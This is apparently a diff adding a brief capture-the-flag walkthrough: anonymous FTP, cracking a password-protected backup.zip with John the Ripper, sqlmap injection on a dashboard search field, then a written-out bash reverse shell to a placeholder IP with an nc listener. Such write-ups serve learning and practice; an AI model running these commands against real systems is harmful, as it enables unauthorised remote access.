@@ -1,0 +1,18 @@
+
+After an nmap scan an ftp service is seen which allows anonymous login . Once entering a file - backup.zip is seen(password protected) . Using john the ripper the folder is decrypted . That's how
+the admin password is discovered (being hardcoded in a file) . Once logging in with admin credentials you are directed to a dashboard.php. Using sqlmap alongside the "phpsessid" a sqli vulnerability
+is discovered in the search input . Using this you can open --os-shell .The following inline bash comand (bash -c "bash -i >& /dev/tcp/TUNIPADDR/PORT 0>&1")on the remote machine alongside (sudo nc
+-lvnp PORT) on the local machine will allow us access to a reverse shell.  
+
+
+
+
+
+
+
+
+
+
+
+
+Observations : Reverse shells can randomly die( Suggestion : Do not rely on them!)
